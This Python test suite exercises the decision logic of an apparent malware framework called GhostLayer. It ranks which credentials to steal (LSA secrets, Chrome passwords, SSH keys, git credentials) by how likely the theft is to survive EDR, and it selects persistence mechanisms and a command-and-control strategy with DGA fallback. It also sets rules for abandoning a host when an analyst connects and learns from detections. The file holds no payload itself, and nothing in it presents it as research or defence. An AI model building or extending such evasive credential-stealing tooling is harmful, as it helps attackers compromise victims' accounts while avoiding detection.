"""
Test Causal Engine Integration with GhostLayer
===============================================

Demonstrates how the causal reasoning engine:
1. Determines threat level
2. Makes strategic extraction decisions
3. Prioritizes credentials based on value/risk trade-off
4. Adapts to environment

Author: Blackroot Agent v4
Date: April 6, 2026
"""

import logging
import sys
import json
from typing import List

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(name)s] %(levelname)s: %(message)s'
)
logger = logging.getLogger("TestCausalEngine")


def test_causal_graphs():
    """Test 1: Verify causal graphs load correctly"""
    logger.info("=" * 70)
    logger.info("TEST 1: Causal Graph Initialization")
    logger.info("=" * 70)
    
    from causal_graph import CausalGraph, create_credential_extraction_graph
    
    # Test extraction graph
    graph = create_credential_extraction_graph()
    logger.info(f"✓ Created credential extraction graph: {graph}")
    
    # Test queries
    effects = graph.query_effects("extract_lsa")
    logger.info(f"✓ Effects of extracting LSA secrets:")
    for effect, impact in sorted(effects.items(), key=lambda x: abs(x[1]), reverse=True):
        print(f"    {effect}: {impact:+.2f}")
    
    print()


def test_causal_simulator():
    """Test 2: Verify causal simulator rankings work"""
    logger.info("=" * 70)
    logger.info("TEST 2: Causal Simulator - Ranking Extraction Targets")
    logger.info("=" * 70)
    
    from causal_graph import create_credential_extraction_graph
    from causal_simulator import CausalSimulator, ThreatEnvironmentType
    
    graph = create_credential_extraction_graph()
    sim = CausalSimulator(graph)
    
    # Test in different threat environments
    environments = [
        ("LOW", ThreatEnvironmentType.LOW, False),
        ("MEDIUM", ThreatEnvironmentType.MEDIUM, False),
        ("HIGH", ThreatEnvironmentType.HIGH, True),
        ("CRITICAL", ThreatEnvironmentType.CRITICAL, True),
    ]
    
    all_targets = ["extract_chrome", "extract_lsa", "extract_ssh", "extract_git"]
    
    for env_name, env_type, edr_detected in environments:
        logger.info(f"\n→ Threat Environment: {env_name} (EDR={edr_detected})")
        logger.info("-" * 50)
        
        ranked = sim.rank_interventions(
            all_targets,
            threat_environment=env_type,
            edr_detected=edr_detected
        )
        
        for i, result in enumerate(ranked, 1):
            print(f"  {i}. {result.intervention.replace('extract_', '').upper()}")
            print(f"     Survival: {result.survival_score:.1%} | Risk: {result.risk_score:.1%} | Value: {result.value_score:.1%}")
            print(f"     Score: {result.overall_score:.3f}")
    
    print()


def test_causal_decision_engine():
    """Test 3: Verify decision engine makes smart choices"""
    logger.info("=" * 70)
    logger.info("TEST 3: Causal Decision Engine - Strategic Decisions")
    logger.info("=" * 70)
    
    from causal_decision_engine import CausalDecisionEngine
    
    engine = CausalDecisionEngine()
    
    # Test scenarios
    scenarios = [
        {
            "name": "LOW THREAT (Home machine, no monitoring)",
            "threat_level": 10,
            "edr_detected": False,
            "privilege_level": "admin"
        },
        {
            "name": "MEDIUM THREAT (Corporate network, basic EDR)",
            "threat_level": 45,
            "edr_detected": True,
            "privilege_level": "admin"
        },
        {
            "name": "HIGH THREAT (Active investigation, advanced EDR)",
            "threat_level": 75,
            "edr_detected": True,
            "privilege_level": "admin"
        },
        {
            "name": "CRITICAL (Analyst connected, should bail)",
            "threat_level": 90,
            "edr_detected": True,
            "privilege_level": "admin"
        },
    ]
    
    for scenario in scenarios:
        logger.info(f"\n→ SCENARIO: {scenario['name']}")
        logger.info(f"  Threat Level: {scenario['threat_level']}/100")
        logger.info(f"  EDR Detected: {scenario['edr_detected']}")
        logger.info(f"  Privilege: {scenario['privilege_level']}")
        logger.info("-" * 50)
        
        # Get extraction targets
        targets = engine.choose_extraction_targets(
            threat_level=scenario['threat_level'],
            edr_detected=scenario['edr_detected'],
            privilege_level=scenario['privilege_level']
        )
        
        logger.info(f"  → Extraction Targets ({len(targets)} selected):")
        for target in targets:
            print(f"     ✓ {target.display_value}")
            print(f"       Reason: {target.reasoning[:70]}...")
        
        # Get persistence strategy
        persistence = engine.choose_persistence_mechanisms(
            threat_level=scenario['threat_level'],
            edr_detected=scenario['edr_detected']
        )
        
        enabled_mechanisms = [k.replace('_persistence', '').replace('_hijacking', '').upper() 
                             for k, v in persistence.items() if v]
        logger.info(f"  → Persistence Mechanisms ({len(enabled_mechanisms)}):")
        for mech in enabled_mechanisms:
            print(f"     ✓ {mech}")
        
        # Get C2 strategy
        c2 = engine.choose_c2_strategy(
            primary_c2_online=(scenario['threat_level'] < 50),
            threat_level=scenario['threat_level']
        )
        
        logger.info(f"  → C2 Strategy:")
        print(f"     {c2['reasoning']}")
        print(f"     Heartbeat: {c2['heartbeat_interval_seconds']/3600:.1f}h")
        print(f"     DGA Fallback: {c2['use_dga_fallback']}")
        
        print()


def test_ghost_layer_integration():
    """Test 4: Verify GhostLayer initializes with causal engine"""
    logger.info("=" * 70)
    logger.info("TEST 4: GhostLayer Integration with Causal Engine")
    logger.info("=" * 70)
    
    try:
        from ghost_layer import GhostLayer
        from black_vault import BlackVault
        
        # Initialize BlackVault
        vault = BlackVault()
        logger.info(f"✓ BlackVault initialized")
        
        # Initialize GhostLayer with causal engine
        ghost = GhostLayer(vault)
        logger.info(f"✓ GhostLayer initialized")
        
        if ghost.causal_engine:
            logger.info(f"✓ Causal engine loaded in GhostLayer")
            logger.info(f"  - Extraction graph: {ghost.causal_engine.extraction_graph}")
            logger.info(f"  - Persistence graph: {ghost.causal_engine.persistence_graph}")
            logger.info(f"  - C2 graph: {ghost.causal_engine.c2_graph}")
            logger.info(f"  - Injection graph: {ghost.causal_engine.injection_graph}")
        else:
            logger.warning("✗ Causal engine NOT loaded in GhostLayer")
        
    except Exception as e:
        logger.error(f"Failed to test GhostLayer integration: {e}")
        import traceback
        traceback.print_exc()
    
    print()


def test_counterfactual_reasoning():
    """Test 5: Verify learning from counterfactual analysis"""
    logger.info("=" * 70)
    logger.info("TEST 5: Counterfactual Analysis - Learning from Mistakes")
    logger.info("=" * 70)
    
    from causal_graph import create_credential_extraction_graph
    from causal_simulator import CausalSimulator, ThreatEnvironmentType
    
    graph = create_credential_extraction_graph()
    sim = CausalSimulator(graph)
    
    logger.info("\n→ Scenario: We extracted Chrome passwords in HIGH threat environment")
    logger.info("  Prediction: Survival probability = 64% (low risk, moderate value)")
    logger.info("  Reality: EDR caught extraction in 2 minutes (actual survival = 10%)")
    logger.info("-" * 50)
    
    # Analyze what went wrong
    counterfactual = sim.counterfactual_analysis(
        actual_intervention="extract_chrome",
        actual_outcome=0.10,  # EDR caught it
        options=["extract_lsa", "extract_ssh", "extract_git"],
        threat_environment=ThreatEnvironmentType.HIGH
    )
    
    logger.info(f"\n✓ Counterfactual Analysis Results:")
    logger.info(f"  Actual intervention: {counterfactual.actual_intervention}")
    logger.info(f"  Predicted outcome: {counterfactual.predicted_outcome:.1%}")
    logger.info(f"  Actual outcome: {counterfactual.actual_outcome:.1%}")
    logger.info(f"  Best alternative: {counterfactual.best_alternative}")
    logger.info(f"  Regret magnitude: {counterfactual.regret_magnitude:.1%}")
    
    logger.info(f"\n  Lessons learned:")
    for i, lesson in enumerate(counterfactual.lessons_learned, 1):
        print(f"    {i}. {lesson}")
    
    print()


def main():
    """Run all causal engine tests"""
    try:
        logger.info("\n" + "=" * 70)
        logger.info("CAUSAL ENGINE INTEGRATION TEST SUITE")
        logger.info("=" * 70 + "\n")
        
        test_causal_graphs()
        test_causal_simulator()
        test_causal_decision_engine()
        test_ghost_layer_integration()
        test_counterfactual_reasoning()
        
        logger.info("=" * 70)
        logger.info("ALL TESTS COMPLETED SUCCESSFULLY")
        logger.info("=" * 70)
        
        return 0
    
    except Exception as e:
        logger.error(f"Test suite failed: {e}")
        import traceback
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())
